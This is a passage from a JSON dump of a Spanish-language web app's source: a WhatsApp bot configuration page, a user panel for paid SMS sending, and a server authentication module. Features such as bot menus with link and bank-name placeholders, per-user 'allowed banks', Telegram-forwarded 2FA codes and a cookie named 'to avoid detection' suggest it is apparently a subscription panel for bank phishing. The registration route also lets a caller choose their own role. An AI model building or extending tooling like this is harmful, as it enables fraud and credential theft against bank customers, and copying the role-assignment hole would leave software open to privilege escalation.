className=\"h-3 w-3 mr-1\" />\n                  Desconectado\n                </Badge>\n              )}\n            </div>\n\n            {status?.isConnected && status?.phoneNumber && (\n              <div>\n                <Label>N煤mero conectado:</Label>\n                <p className=\"text-sm font-mono bg-gray-100 p-2 rounded mt-1\">\n                  {status.phoneNumber}\n                </p>\n              </div>\n            )}\n\n            {!status?.isConnected && status?.qrCode && (\n              <div>\n                <Label>Escanea este c贸digo QR con WhatsApp:</Label>\n                <div className=\"bg-white p-4 rounded-lg border mt-2\">\n                  <img \n                    src={status.qrCode} \n                    alt=\"QR Code\" \n                    className=\"mx-auto\"\n                    data-testid=\"img-qr-code\"\n                  />\n                </div>\n              </div>\n            )}\n\n            <div className=\"flex gap-2\">\n              <Button\n                onClick={() => startStopBotMutation.mutate(\"start\")}\n                disabled={status?.isConnected || startStopBotMutation.isPending}\n                className=\"flex-1\"\n                data-testid=\"button-start-bot\"\n              >\n                <Power className=\"h-4 w-4 mr-2\" />\n                Iniciar Bot\n              </Button>\n              <Button\n                onClick={() => startStopBotMutation.mutate(\"stop\")}\n                disabled={!status?.isConnected || startStopBotMutation.isPending}\n                variant=\"destructive\"\n                className=\"flex-1\"\n                data-testid=\"button-stop-bot\"\n              >\n                <Power className=\"h-4 w-4 mr-2\" />\n                Detener Bot\n              </Button>\n            </div>\n          </CardContent>\n        </Card>\n\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center gap-2\">\n              <MessageSquare className=\"h-5 w-5\" />\n              Configuraci贸n del Bot\n            </CardTitle>\n          </CardHeader>\n          <CardContent className=\"space-y-4\">\n            <div>\n              <Label>N煤mero de WhatsApp (10 d铆gitos)</Label>\n              <Input\n                value={phoneNumber}\n                onChange={(e) => setPhoneNumber(e.target.value)}\n                placeholder=\"5531781885\"\n                data-testid=\"input-phone-number\"\n              />\n            </div>\n\n            <div>\n              <Label>Mensaje de Bienvenida</Label>\n              <Textarea\n                value={welcomeMessage}\n                onChange={(e) => setWelcomeMessage(e.target.value)}\n                placeholder=\"Hola! Bienvenido...\"\n                rows={4}\n                data-testid=\"textarea-welcome-message\"\n              />\n            </div>\n\n            <Button\n              onClick={handleSaveConfig}\n              disabled={updateConfigMutation.isPending}\n              className=\"w-full\"\n              data-testid=\"button-save-config\"\n            >\n              <Save className=\"h-4 w-4 mr-2\" />\n              Guardar Configuraci贸n\n            </Button>\n          </CardContent>\n        </Card>\n      </div>\n\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center justify-between\">\n            <span className=\"flex items-center gap-2\">\n              <MessageSquare className=\"h-5 w-5\" />\n              Opciones del Men煤\n            </span>\n            <Button\n              onClick={() => handleAddOption()}\n              size=\"sm\"\n              data-testid=\"button-add-main-option\"\n            >\n              <Plus className=\"h-4 w-4 mr-1\" />\n              Agregar Opci贸n\n            </Button>\n          </CardTitle>\n          <CardDescription>\n            Configura las opciones del men煤 de tu bot. Usa (liga) para insertar enlaces y (banco) para nombres de bancos.\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <ScrollArea className=\"h-96\">\n            {editedOptions.filter(o => !o.parentId).map((option, index) => {\n              const globalIndex = editedOptions.findIndex(o => o === option);\n              return renderMenuOption(option, globalIndex);\n            })}\n\n            {editedOptions.length === 0 && (\n              <div className=\"text-center py-8 text-gray-500\">\n                <MessageSquare className=\"h-12 w-12 mx-auto mb-3 opacity-50\" />\n                <p>No hay opciones configuradas. Haz clic en \"Agregar Opci贸n\" para comenzar.</p>\n              </div>\n            )}\n          </ScrollArea>\n\n          {hasUnsavedChanges && (\n            <Button\n              onClick={handleSaveAllChanges}\n              className=\"w-full mt-4\"\n              data-testid=\"button-save-all-changes\"\n            >\n              <Save className=\"h-4 w-4 mr-2\" />\n              Guardar Todos los Cambios\n            </Button>\n          )}\n        </CardContent>\n      </Card>\n\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <Send className=\"h-5 w-5\" />\n            Enviar Mensaje de Prueba\n          </CardTitle>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          <div>\n            <Label>N煤mero de Prueba (10 d铆gitos)</Label>\n            <Input\n              value={testNumber}\n              onChange={(e) => setTestNumber(e.target.value)}\n              placeholder=\"5531781885\"\n              data-testid=\"input-test-number\"\n            />\n          </div>\n\n          <Button\n            onClick={handleSendTestMessage}\n            disabled={!status?.isConnected || sendTestMessageMutation.isPending}\n            className=\"w-full\"\n            data-testid=\"button-send-test\"\n          >\n            <Send className=\"h-4 w-4 mr-2\" />\n            Enviar Mensaje de Prueba\n          </Button>\n\n          {!status?.isConnected && (\n            <Alert>\n              <AlertDescription>\n                El bot debe estar conectado para enviar mensajes de prueba.\n              </AlertDescription>\n            </Alert>\n          )}\n        </CardContent>\n      </Card>\n    </div>\n  );\n}\n","size_bytes":19700},"client/src/pages/UserPanel.tsx":{"content":"import { useState } from \"react\";\nimport { useQuery, useMutation } from \"@tanstack/react-query\";\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Textarea } from \"@/components/ui/textarea\";\nimport { Badge } from \"@/components/ui/badge\";\nimport { Alert, AlertDescription } from \"@/components/ui/alert\";\nimport { Separator } from \"@/components/ui/separator\";\nimport { ScrollArea } from \"@/components/ui/scroll-area\";\nimport { Tabs, TabsContent, TabsList, TabsTrigger } from \"@/components/ui/tabs\";\nimport { \n  CreditCard, \n  MessageSquare, \n  Bell, \n  Clock, \n  User, \n  Settings,\n  Send,\n  History,\n  Calendar,\n  Bot\n} from \"lucide-react\";\nimport { apiRequest, queryClient } from \"@/lib/queryClient\";\nimport { useAuth } from \"@/hooks/use-auth\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport { format } from \"date-fns\";\nimport { es } from \"date-fns/locale\";\nimport UserWhatsAppPanel from \"@/components/user/UserWhatsAppPanel\";\nimport UserFlowManager from \"@/components/user/UserFlowManager\";\n\ninterface UserData {\n  id: number;\n  username: string;\n  role: string;\n  isActive: boolean;\n  expiresAt: string | null;\n  deviceCount: number;\n  maxDevices: number;\n  allowedBanks: string;\n  telegramChatId: string | null;\n  createdAt: string | null;\n  lastLogin: string | null;\n}\n\ninterface SmsCredits {\n  credits: number;\n}\n\ninterface SmsHistory {\n  id: number;\n  phone: string;\n  message: string;\n  status: string;\n  createdAt: string;\n  errorMessage: string | null;\n}\n\nexport default function UserPanel() {\n  const { user, logoutMutation } = useAuth();\n  const { toast } = useToast();\n  const [phone, setPhone] = useState(\"\");\n  const [message, setMessage] = useState(\"\");\n\n  // Obtener datos del usuario\n  const { data: userData, isLoading: userLoading } = useQuery<UserData>({\n    queryKey: ['/api/user'],\n    enabled: !!user\n  });\n\n  // Obtener cr茅ditos SMS\n  const { data: smsCredits, isLoading: creditsLoading } = useQuery<SmsCredits>({\n    queryKey: ['/api/sms/credits'],\n    enabled: !!user\n  });\n\n  // Obtener historial SMS\n  const { data: smsHistory, isLoading: historyLoading } = useQuery<SmsHistory[]>({\n    queryKey: ['/api/sms/history'],\n    enabled: !!user\n  });\n\n  // Mutaci贸n para enviar SMS\n  const sendSmsMutation = useMutation({\n    mutationFn: async (data: { phone: string; message: string }) => {\n      return await apiRequest(\"POST\", \"/api/sms/send\", data);\n    },\n    onSuccess: () => {\n      toast({\n        title: \"SMS Enviado\",\n        description: \"El mensaje ha sido enviado exitosamente\"\n      });\n      setPhone(\"\");\n      setMessage(\"\");\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits'] });\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/history'] });\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error al enviar SMS\",\n        variant: \"destructive\"\n      });\n    }\n  });\n\n  const handleSendSms = (e: React.FormEvent) => {\n    e.preventDefault();\n    if (phone.trim() && message.trim()) {\n      sendSmsMutation.mutate({ phone: phone.trim(), message: message.trim() });\n    }\n  };\n\n  const handleLogout = () => {\n    logoutMutation.mutate();\n  };\n\n  const getStatusBadge = (isActive: boolean, expiresAt: string | null) => {\n    if (!isActive) {\n      return <Badge variant=\"destructive\">Inactivo</Badge>;\n    }\n    \n    if (expiresAt) {\n      const expiry = new Date(expiresAt);\n      const now = new Date();\n      const hoursLeft = (expiry.getTime() - now.getTime()) / (1000 * 60 * 60);\n      \n      if (hoursLeft <= 24) {\n        return <Badge variant=\"outline\" className=\"border-orange-500 text-orange-700\">Expira pronto</Badge>;\n      }\n    }\n    \n    return <Badge variant=\"default\" className=\"bg-green-600\">Activo</Badge>;\n  };\n\n  if (userLoading) {\n    return (\n      <div className=\"min-h-screen flex items-center justify-center\">\n        <div className=\"text-center\">\n          <div className=\"animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4\"></div>\n          <p>Cargando panel...</p>\n        </div>\n      </div>\n    );\n  }\n\n  return (\n    <div className=\"min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4\">\n      <div className=\"max-w-6xl mx-auto space-y-6\">\n        {/* Header */}\n        <div className=\"flex justify-between items-center\">\n          <div>\n            <h1 className=\"text-3xl font-bold text-gray-900\">Panel de Usuario</h1>\n            <p className=\"text-gray-600\">Bienvenido, {userData?.username}</p>\n          </div>\n          <Button onClick={() => logoutMutation.mutate()} variant=\"outline\">\n            Cerrar Sesi贸n\n          </Button>\n        </div>\n\n        {/* Mensaje de Soporte T茅cnico */}\n        <Alert className=\"border-blue-200 bg-blue-50\">\n          <MessageSquare className=\"h-4 w-4 text-blue-600\" />\n          <AlertDescription>\n            <div className=\"flex flex-col gap-1\">\n              <span className=\"font-medium text-blue-800\">Soporte T茅cnico y Suscripciones:</span>\n              <span className=\"text-blue-700\">\n                Para soporte t茅cnico o gesti贸n de suscripciones, comun铆cate por Telegram con{' '}\n                <span className=\"font-semibold\">@BalonxSistema</span>\n              </span>\n            </div>\n          </AlertDescription>\n        </Alert>\n\n        <Tabs defaultValue=\"account\" className=\"space-y-6\">\n          <TabsList className=\"grid w-full grid-cols-4\">\n            <TabsTrigger value=\"account\" data-testid=\"tab-account\">\n              <User className=\"h-4 w-4 mr-2\" />\n              Cuenta\n            </TabsTrigger>\n            <TabsTrigger value=\"flows\" data-testid=\"tab-flows\">\n              <Settings className=\"h-4 w-4 mr-2\" />\n              Flujos\n            </TabsTrigger>\n            <TabsTrigger value=\"sms\" data-testid=\"tab-sms\">\n              <MessageSquare className=\"h-4 w-4 mr-2\" />\n              SMS\n            </TabsTrigger>\n            <TabsTrigger value=\"whatsapp\" data-testid=\"tab-whatsapp\">\n              <Bot className=\"h-4 w-4 mr-2\" />\n              WhatsApp Bot\n            </TabsTrigger>\n          </TabsList>\n\n          <TabsContent value=\"account\" className=\"space-y-6\">\n            {/* Informaci贸n del Usuario */}\n            <Card>\n              <CardHeader>\n                <CardTitle className=\"flex items-center gap-2\">\n                  <User className=\"h-5 w-5\" />\n                  Informaci贸n de la Cuenta\n                </CardTitle>\n              </CardHeader>\n              <CardContent>\n                <div className=\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4\">\n                  <div>\n                    <Label className=\"text-sm font-medium text-gray-500\">Estado</Label>\n                    <div className=\"mt-1\">\n                      {userData && getStatusBadge(userData.isActive, userData.expiresAt)}\n                    </div>\n                  </div>\n                  <div>\n                    <Label className=\"text-sm font-medium text-gray-500\">Dispositivos</Label>\n                    <p className=\"text-lg font-semibold\">{userData?.deviceCount || 0}/{userData?.maxDevices || 0}</p>\n                  </div>\n                  <div>\n                    <Label className=\"text-sm font-medium text-gray-500\">Bancos Permitidos</Label>\n                    <p className=\"text-sm\">{userData?.allowedBanks === 'all' ? 'Todos' : userData?.allowedBanks}</p>\n                  </div>\n                  <div>\n                    <Label className=\"text-sm font-medium text-gray-500\">Expira</Label>\n                    <p className=\"text-sm\">\n                      {userData?.expiresAt \n                        ? format(new Date(userData.expiresAt), \"dd/MM/yyyy HH:mm\", { locale: es })\n                        : \"Sin fecha\"\n                      }\n                    </p>\n                  </div>\n                </div>\n\n                {userData?.expiresAt && userData?.isActive && (\n                  <Alert className=\"mt-4\">\n                    <Calendar className=\"h-4 w-4\" />\n                    <AlertDescription>\n                      Tu suscripci贸n expira el {format(new Date(userData.expiresAt), \"dd 'de' MMMM 'a las' HH:mm\", { locale: es })}. \n                      Para renovar, contacta a @balonxSistema\n                    </AlertDescription>\n                  </Alert>\n                )}\n              </CardContent>\n            </Card>\n\n            {/* Informaci贸n de Soporte */}\n            <Card>\n              <CardHeader>\n                <CardTitle className=\"flex items-center gap-2\">\n                  <Settings className=\"h-5 w-5\" />\n                  Soporte y Configuraci贸n\n                </CardTitle>\n              </CardHeader>\n              <CardContent>\n                <div className=\"grid grid-cols-1 md:grid-cols-2 gap-4\">\n                  <div>\n                    <Label className=\"text-sm font-medium text-gray-500\">Chat ID de Telegram</Label>\n                    <p className=\"text-sm font-mono bg-gray-100 p-2 rounded\">\n                      {userData?.telegramChatId || \"No configurado\"}\n                    </p>\n                  </div>\n                  <div>\n                    <Label className=\"text-sm font-medium text-gray-500\">Soporte</Label>\n                    <p className=\"text-sm\">\n                      Para soporte t茅cnico, contacta: <span className=\"font-medium\">@balonxSistema</span>\n                    </p>\n                  </div>\n                </div>\n\n                <Alert className=\"mt-4\">\n                  <Bell className=\"h-4 w-4\" />\n                  <AlertDescription>\n                    Las notificaciones y c贸digos 2FA se env铆an autom谩ticamente a tu Telegram configurado.\n                    Si no recibes notificaciones, verifica tu Chat ID con el bot.\n                  </AlertDescription>\n                </Alert>\n              </CardContent>\n            </Card>\n          </TabsContent>\n\n          <TabsContent value=\"sms\" className=\"space-y-6\">\n            <div className=\"grid grid-cols-1 lg:grid-cols-2 gap-6\">\n          {/* Env铆o de SMS */}\n          <Card>\n            <CardHeader>\n              <CardTitle className=\"flex items-center gap-2\">\n                <MessageSquare className=\"h-5 w-5\" />\n                Env铆o de SMS\n              </CardTitle>\n              <CardDescription>\n                Cr茅ditos disponibles: <span className=\"font-semibold\">{smsCredits?.credits || 0}</span>\n              </CardDescription>\n            </CardHeader>\n            <CardContent>\n              <form onSubmit={handleSendSms} className=\"space-y-4\">\n                <div>\n                  <Label htmlFor=\"phone\">N煤mero de Tel茅fono</Label>\n                  <Input\n                    id=\"phone\"\n                    type=\"tel\"\n                    placeholder=\"+525512345678\"\n                    value={phone}\n                    onChange={(e) => setPhone(e.target.value)}\n                    required\n                  />\n                </div>\n                <div>\n                  <Label htmlFor=\"message\">Mensaje</Label>\n                  <Textarea\n                    id=\"message\"\n                    placeholder=\"Escribe tu mensaje aqu铆...\"\n                    value={message}\n                    onChange={(e) => setMessage(e.target.value)}\n                    rows={4}\n                    required\n                  />\n                  <p className=\"text-sm text-gray-500 mt-1\">\n                    {message.length}/160 caracteres\n                  </p>\n                </div>\n                <Button \n                  type=\"submit\" \n                  className=\"w-full\"\n                  disabled={!phone.trim() || !message.trim() || sendSmsMutation.isPending || (smsCredits?.credits || 0) <= 0}\n                >\n                  {sendSmsMutation.isPending ? (\n                    <>Enviando...</>\n                  ) : (\n                    <>\n                      <Send className=\"h-4 w-4 mr-2\" />\n                      Enviar SMS\n                    </>\n                  )}\n                </Button>\n              </form>\n\n              {(smsCredits?.credits || 0) <= 0 && (\n                <Alert className=\"mt-4\">\n                  <CreditCard className=\"h-4 w-4\" />\n                  <AlertDescription>\n                    No tienes cr茅ditos SMS disponibles. Contacta al administrador para solicitar m谩s cr茅ditos.\n                  </AlertDescription>\n                </Alert>\n              )}\n            </CardContent>\n          </Card>\n\n          {/* Historial de SMS */}\n          <Card>\n            <CardHeader>\n              <CardTitle className=\"flex items-center gap-2\">\n                <History className=\"h-5 w-5\" />\n                Historial de SMS\n              </CardTitle>\n            </CardHeader>\n            <CardContent>\n              <ScrollArea className=\"h-96\">\n                {historyLoading ? (\n                  <div className=\"text-center py-4\">\n                    <div className=\"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto\"></div>\n                  </div>\n                ) : smsHistory && smsHistory.length > 0 ? (\n                  <div className=\"space-y-3\">\n                    {smsHistory.map((sms) => (\n                      <div key={sms.id} className=\"border rounded-lg p-3\">\n                        <div className=\"flex justify-between items-start mb-2\">\n                          <span className=\"font-medium\">{sms.phone}</span>\n                          <Badge variant={sms.status === 'sent' ? 'default' : 'destructive'}>\n                            {sms.status === 'sent' ? 'Enviado' : 'Error'}\n                          </Badge>\n                        </div>\n                        <p className=\"text-sm text-gray-600 mb-2\">{sms.message}</p>\n                        <div className=\"flex items-center text-xs text-gray-500\">\n                          <Clock className=\"h-3 w-3 mr-1\" />\n                          {format(new Date(sms.createdAt), \"dd/MM/yyyy HH:mm\", { locale: es })}\n                        </div>\n                        {sms.errorMessage && (\n                          <p className=\"text-xs text-red-600 mt-1\">{sms.errorMessage}</p>\n                        )}\n                      </div>\n                    ))}\n                  </div>\n                ) : (\n                  <div className=\"text-center py-8 text-gray-500\">\n                    <MessageSquare className=\"h-12 w-12 mx-auto mb-3 opacity-50\" />\n                    <p>No hay mensajes enviados</p>\n                  </div>\n                )}\n              </ScrollArea>\n            </CardContent>\n          </Card>\n            </div>\n          </TabsContent>\n\n          <TabsContent value=\"flows\">\n            <UserFlowManager />\n          </TabsContent>\n\n          <TabsContent value=\"whatsapp\">\n            <UserWhatsAppPanel />\n          </TabsContent>\n        </Tabs>\n      </div>\n    </div>\n  );\n}","size_bytes":15091},"server/auth.ts":{"content":"import passport from \"passport\";\nimport { Strategy as LocalStrategy } from \"passport-local\";\nimport { Express } from \"express\";\nimport session from \"express-session\";\nimport { storage } from \"./storage\";\nimport { UserRole } from \"@shared/schema\";\nimport { nanoid } from \"nanoid\";\nimport MemoryStore from \"memorystore\";\nimport bcrypt from \"bcrypt\";\n\n// Use an interface instead of the direct User type to avoid circular references\nexport interface UserWithAuth {\n  id: number;\n  username: string;\n  password: string;\n  role: UserRole;\n  isActive: boolean;\n  expiresAt: Date | null;\n  deviceCount: number;\n  maxDevices: number;\n  allowedBanks: string; // 'all' o lista separada por comas\n  telegramChatId: string | null;\n  createdAt: Date | null;\n  lastLogin: Date | null;\n}\n\ndeclare global {\n  namespace Express {\n    // Define the User interface for express session\n    interface User extends UserWithAuth {}\n  }\n}\n\n// Extend session data from express-session\ndeclare module 'express-session' {\n  interface SessionData {\n    pendingUser?: {\n      id: number;\n      username: string;\n      timestamp: number;\n    };\n  }\n}\n\n// Crear almacenamiento para sesiones\nconst MemoryStoreSession = MemoryStore(session);\nconst sessionStore = new MemoryStoreSession({\n  checkPeriod: 86400000 // Prune expired entries every 24h\n});\n\n// Sistema de control de sesiones concurrentes\ninterface ActiveSession {\n  sessionId: string;\n  userId: number;\n  timestamp: number;\n  userAgent?: string;\n}\n\n// Map para rastrear sesiones activas por usuario\nconst activeSessions = new Map<number, ActiveSession[]>();\nconst MAX_SESSIONS_PER_USER = 2;\n\n// Funci贸n para limpiar sesiones de un usuario\nfunction cleanupUserSessions(userId: number, sessionId?: string) {\n  const userSessions = activeSessions.get(userId) || [];\n  const filteredSessions = sessionId \n    ? userSessions.filter(session => session.sessionId !== sessionId)\n    : [];\n  \n  if (filteredSessions.length === 0) {\n    activeSessions.delete(userId);\n  } else {\n    activeSessions.set(userId, filteredSessions);\n  }\n}\n\n// Funci贸n para agregar sesi贸n activa\nfunction addActiveSession(userId: number, sessionId: string, userAgent?: string) {\n  const userSessions = activeSessions.get(userId) || [];\n  const newSession: ActiveSession = {\n    sessionId,\n    userId,\n    timestamp: Date.now(),\n    userAgent\n  };\n  \n  userSessions.push(newSession);\n  activeSessions.set(userId, userSessions);\n}\n\n// Funci贸n para cerrar sesiones m谩s antiguas\nfunction closeOldestSessions(userId: number, keepCount: number = MAX_SESSIONS_PER_USER - 1) {\n  const userSessions = activeSessions.get(userId) || [];\n  \n  if (userSessions.length >= MAX_SESSIONS_PER_USER) {\n    // Ordenar por timestamp (m谩s antiguas primero)\n    userSessions.sort((a, b) => a.timestamp - b.timestamp);\n    \n    // Determinar cu谩ntas sesiones cerrar\n    const sessionsToClose = userSessions.length - keepCount;\n    const oldSessions = userSessions.splice(0, sessionsToClose);\n    \n    // Cerrar sesiones en el store\n    oldSessions.forEach(session => {\n      console.log(`[SessionControl] Cerrando sesi贸n antigua ${session.sessionId} del usuario ${userId}`);\n      sessionStore.destroy(session.sessionId, (err) => {\n        if (err) {\n          console.error(`[SessionControl] Error cerrando sesi贸n ${session.sessionId}:`, err);\n        }\n      });\n    });\n    \n    // Actualizar el mapa\n    activeSessions.set(userId, userSessions);\n    \n    return oldSessions.length;\n  }\n  \n  return 0;\n}\n\n// Funci贸n para hashear contrase帽as\nexport async function hashPassword(password: string) {\n  return bcrypt.hash(password, 10);\n}\n\n// Funci贸n para comparar contrase帽as (hash almacenado vs contrase帽a proporcionada)\nexport async function comparePasswords(supplied: string, stored: string) {\n  return bcrypt.compare(supplied, stored);\n}\n\nexport function setupAuth(app: Express) {\n  // Configurar sesiones y passport\n  const sessionSettings: session.SessionOptions = {\n    secret: process.env.SESSION_SECRET || nanoid(),\n    resave: false,\n    saveUninitialized: false,\n    store: sessionStore,\n    name: 'platform.secure.token', // Nombre gen茅rico para evitar detecci贸n\n    rolling: true, // Renueva la cookie en cada interacci贸n para reiniciar el tiempo de inactividad\n    cookie: {\n      secure: process.env.NODE_ENV === 'production', // Cookies seguras solo en producci贸n\n      maxAge: 40 * 60 * 1000, // 40 minutos de inactividad m谩xima\n      sameSite: 'lax', // Menos restrictivo que 'strict', m谩s seguro que 'none'\n      httpOnly: true, // Mayor seguridad\n      path: '/'\n    },\n  };\n\n  app.set(\"trust proxy\", 1);\n  app.use(session(sessionSettings));\n  app.use(passport.initialize());\n  app.use(passport.session());\n\n  // Middleware para rastrear sesiones activas\n  app.use((req, res, next) => {\n    // Si hay un usuario autenticado y no est谩 registrado en el control de sesiones, agregarlo\n    if (req.isAuthenticated() && req.user) {\n      const user = req.user as Express.User;\n      const sessionId = req.sessionID;\n      const userSessions = activeSessions.get(user.id) || [];\n      \n      // Verificar si esta sesi贸n ya est谩 registrada\n      const sessionExists = userSessions.some(session => session.sessionId === sessionId);\n      if (!sessionExists) {\n        const userAgent = req.get('User-Agent');\n        addActiveSession(user.id, sessionId, userAgent);\n        console.log(`[SessionControl] Sesi贸n existente ${sessionId} agregada al control para usuario ${user.username}`);\n      }\n    }\n    next();\n  });\n\n  // Limpieza peri贸dica de sesiones inv谩lidas cada 5 minutos\n  setInterval(() => {\n    console.log(`[SessionControl] Ejecutando limpieza de sesiones inv谩lidas...`);\n    let cleanedSessions = 0;\n    \n    Array.from(activeSessions.entries()).forEach(([userId, userSessions]) => {\n      const validSessions: ActiveSession[] = [];\n      \n      userSessions.forEach((session) => {\n        // Verificar si la sesi贸n a煤n existe en el store\n        sessionStore.get(session.sessionId, (err, sessionData) => {\n          if (err || !sessionData) {\n            console.log(`[SessionControl] Sesi贸n inv谩lida ${session.sessionId} removida del usuario ${userId}`);\n            cleanedSessions++;\n          } else {\n            validSessions.push(session);\n          }\n        });\n      });\n      \n      // Actualizar la lista de sesiones v谩lidas\n      if (validSessions.length === 0) {\n        activeSessions.delete(userId);\n      } else if (validSessions.length !== userSessions.length) {\n        activeSessions.set(userId, validSessions);\n      }\n    });\n    \n    if (cleanedSessions > 0) {\n      console.log(`[SessionControl] Limpieza completada: ${cleanedSessions} sesiones inv谩lidas removidas`);\n    }\n  }, 5 * 60 * 1000); // Cada 5 minutos\n\n  // Configurar estrategia local (username + password)\n  passport.use(\n    new LocalStrategy(async (username, password, done) => {\n      try {\n        const user = await storage.getUserByUsername(username);\n        if (!user) {\n          return done(null, false);\n        }\n        \n        // Verificar si la contrase帽a coincide\n        const passwordMatches = await comparePasswords(password, user.password);\n        if (!passwordMatches) {\n          return done(null, false);\n        }\n\n        // Verificar si el usuario est谩 activo (solo para usuarios no admin)\n        if (user.role !== UserRole.ADMIN && !user.isActive) {\n          console.log(`[Auth] Usuario inactivo: ${username}, no puede iniciar sesi贸n`);\n          return done(null, false, { message: \"Tu cuenta requiere aprobaci贸n del administrador. Una vez aprobada, recibir谩s una notificaci贸n por Telegram. Contacta: @BalonxSistema\" });\n        }\n        \n        // Verificar si la cuenta ha vencido (expiresAt en el pasado)\n        if (user.role !== UserRole.ADMIN && user.expiresAt && new Date(user.expiresAt) < new Date()) {\n          console.log(`[Auth] Usuario con cuenta vencida: ${username}, expiresAt: ${user.expiresAt}`);\n          \n          // Desactivar autom谩ticamente el usuario si est谩 vencido\n          await storage.updateUser(user.id, { isActive: false });\n          \n          return done(null, false, { \n            message: \"Tu cuenta ha vencido. Por favor contacta al administrador en Telegram: @BalonxSistema para renovar tu suscripci贸n.\" \n          });\n        }\n        \n        // Verificar si la cuenta est谩 por vencer pronto (en menos de 24 horas)\n        let expirationWarning = null;\n        if (user.role !== UserRole.ADMIN && user.expiresAt) {\n          const expiresAt = new Date(user.expiresAt);\n          const now = new Date();\n          const hoursRemaining = (expiresAt.getTime() - now.getTime()) / (1000 * 60 * 60);\n          \n          if (hoursRemaining < 24) {\n            expirationWarning = `Tu cuenta vence en menos de 24 horas. Contacta al administrador en Telegram: @BalonxSistema para renovar.`;\n            console.log(`[Auth] Usuario con cuenta por vencer pronto: ${username}, horas restantes: ${hoursRemaining.toFixed(1)}`);\n          }\n        }\n        \n        console.log(`[Auth] Login exitoso para: ${username}, role: ${user.role}, isActive: ${user.isActive}`);\n        \n        // Actualizar la fecha del 煤ltimo inicio de sesi贸n\n        await storage.updateUserLastLogin(user.id);\n\n        return done(null, user as Express.User);\n      } catch (error) {\n        return done(error);\n      }\n    })\n  );\n\n  // Serializaci贸n y deserializaci贸n de usuario\n  passport.serializeUser((user: any, done) => {\n    // Guardar tipo de usuario (ejecutivo o normal) junto con el ID\n    const serializedData = {\n      id: user.id,\n      isExecutive: user.isExecutive || false,\n      officeUserId: user.officeUserId\n    };\n    done(null, serializedData);\n  });\n\n  passport.deserializeUser(async (serializedData: any, done) => {\n    try {\n      // Si es un ejecutivo, reconstruir el usuario virtual\n      if (serializedData.isExecutive) {\n        const executive = await storage.getExecutiveById(serializedData.id);\n        if (!executive) {\n          return done(null, false);\n        }\n        \n        const officeUser = await storage.getUserById(serializedData.officeUserId || executive.userId);\n        if (!officeUser) {\n          return done(null, false);\n        }\n        \n        // Reconstruir el usuario virtual del ejecutivo\n        const executiveUser = {\n          id: executive.id,\n          username: executive.username,\n          displayName: executive.displayName,\n          role: officeUser.role,\n          isActive: executive.isActive,\n          allowedBanks: officeUser.allowedBanks,\n          accountType: officeUser.accountType,\n          isExecutive: true,\n          officeUserId: officeUser.id,\n          officeUsername: officeUser.username\n        };\n        \n        return done(null, executiveUser as Express.User);\n      } else {\n        // Usuario normal\n        const user = await storage.getUserById(serializedData.id || serializedData);\n        done(null, user as Express.User);\n      }\n    } catch (error) {\n      done(error);\n    }\n  });\n\n  // Ruta para registro de usuarios\n  app.post(\"/api/register\", async (req, res, next) => {\n    try {\n      const { username, password, telegramChatId, role = UserRole.USER, allowedBanks = 'all', discountCode, accountType = 'individual' } = req.body;\n      \n      // Validar datos\n      if (!username || !password) {\n        return res.status(400).json({ message: \"Username and password are required\" });\n      }\n      \n      // El telegramChatId ahora es opcional - puede configurarse despu茅s por administradores\n      \n      // Verificar si el usuario ya existe\n      const existingUser = await storage.getUserByUsername(username);\n      if (existingUser) {\n        return res.status(400).json({ message: \"Username already exists\" });\n      }\n      \n      // Determinar precio base y l铆mite de dispositivos seg煤n tipo de cuenta\n      const isOffice = accountType === 'office';\n      const basePrice = isOffice ? 6000 : 3000; // Oficina: 6000 MXN, Individual: 3000 MXN\n      const maxDevices = 2; // Ambos tipos tienen 2 dispositivos\n      const maxExecutives = isOffice ? 8 : 0; // Solo oficinas tienen ejecutivos\n      \n      // Validar y aplicar c贸digo de descuento si se proporcion贸\n      let customPrice: string | undefined = undefined;\n      let discountApplied = 0;\n      let claimedDiscount: any = null;\n      \n      if (discountCode) {\n        // Reclamar c贸digo de forma at贸mica (marca como usado sin userId primero)\n        claimedDiscount = await storage.claimDiscountCode(discountCode);\n        \n        if (!claimedDiscount) {\n          return res.status(400).json({ message: \"C贸digo de descuento no v谩lido o ya fue utilizado\" });\n        }\n        \n        // Calcular precio con descuento\n        const discountAmount = parseFloat(claimedDiscount.discountAmount);\n        const finalPrice = Math.max(0, basePrice - discountAmount); // No permitir precios negativos\n        \n        customPrice = finalPrice.toFixed(2);\n        discountApplied = discountAmount;\n        \n        console.log(`[Auth] C贸digo de descuento ${discountCode} aplicado: $${discountAmount} MXN. Precio final: $${customPrice} MXN`);\n      }\n      \n      // Normalizar el allowedBanks si es 'all' (sin importar may煤sculas/min煤sculas)\n      const normalizedAllowedBanks = \n        typeof allowedBanks === 'string' && allowedBanks.toLowerCase() === 'all' \n          ? 'all' \n          : allowedBanks;\n      \n      console.log(`[Auth] Creando usuario ${accountType === 'office' ? 'OFICINA' : 'INDIVIDUAL'} ${username} con bancos permitidos: ${normalizedAllowedBanks}`);\n      \n      // Crear nuevo usuario con contrase帽a hasheada y estado inactivo por defecto\n      const hashedPassword = await hashPassword(password);\n      const user = await storage.createUser({\n        username,\n        password: hashedPassword,\n        role,\n        allowedBanks: normalizedAllowedBanks,\n        telegramChatId,\n        customPrice,\n        isActive: false, // Los usuarios nuevos requieren aprobaci贸n del administrador\n        accountType,\n        weeklyPrice: basePrice,\n        maxExecutives,\n        maxDevices,\n      });\n      \n      // Si es una cuenta de oficina, crear perfil de oficina\n      if (isOffice) {\n        try {\n          await storage.createOfficeProfile({\n            userId: user.id,\n            weeklyPrice: basePrice,\n            